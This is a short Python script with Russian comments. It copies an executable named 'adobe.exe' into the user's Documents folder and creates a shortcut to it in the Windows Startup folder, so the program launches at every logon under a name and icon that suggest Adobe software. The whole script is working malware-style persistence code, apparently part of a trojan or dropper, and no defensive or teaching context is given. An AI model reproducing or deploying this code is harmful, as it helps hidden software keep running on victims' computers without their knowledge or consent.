import os
import shutil
import getpass

user = getpass.getuser()
p = os.path.abspath('adobe.exe')
t = "C:\\Users\\"+ user + "\\Documents\\adobe.exe"

shutil.copyfile(p, t)

import os, winshell
from win32com.client import Dispatch

# Получаем путь 
desktop = "C:\\Users\\" + user + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
# Соединяем пути, с учётом разных операционок.
path = os.path.join(desktop, "adobe.lnk")
# Задаём путь к файлу, к которому делаем ярлык.
target = "C:\\Users\\" + user + "\\Documents\\adobe.exe"
# Назначаем путь к рабочей папке.
wDir = "C:\\Users\\" + user + "\\Documents\\"
# Путь к нужной нам иконке.
icon = "C:\\Users\\" + user + "\\Documents\\adobe.exe"
# С помощью метода Dispatch, обьявляем работу с Wscript (работа с ярлыками, реестром и прочей системной информацией в windows)
shell = Dispatch('WScript.Shell')
# Создаём ярлык.
shortcut = shell.CreateShortCut(path)
# Путь к файлу, к которому делаем ярлык.
shortcut.Targetpath = target
# Путь к рабочей папке.
shortcut.WorkingDirectory = wDir
# Тырим иконку.
shortcut.IconLocation = icon
# Обязательное действо, сохраняем ярлык.
shortcut.save()
